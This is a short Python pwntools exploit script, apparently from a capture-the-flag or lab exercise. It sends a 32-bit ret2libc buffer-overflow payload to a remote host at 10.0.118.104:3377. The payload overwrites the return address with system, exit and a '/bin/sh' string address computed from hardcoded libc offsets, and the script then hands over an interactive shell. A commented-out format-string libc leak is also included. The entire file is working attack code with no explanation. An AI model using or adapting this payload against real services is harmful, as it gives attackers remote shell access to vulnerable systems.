from pwn import *

p = remote("10.0.118.104",3377)

offset = 132

puts_offset = 0x5f150
system_offset = 0x3a950
exit_offset = 0x2e7c0
binsh_offset = 0x15912b

# p.recvuntil(b"name?")

# # leak libc
# p.sendline(b"%7$p")

# p.recvuntil(b"Hello, ")
# leak = int(p.recvline().strip().rstrip(b"!"), 16)
leak = 0xf7fc7000
libc_base = leak - puts_offset

system = libc_base + system_offset
exit = libc_base + exit_offset
binsh = libc_base + binsh_offset

payload = b"A"*offset
payload += p32(system)
payload += p32(exit)
payload += p32(binsh)

p.sendline(payload)

p.interactive()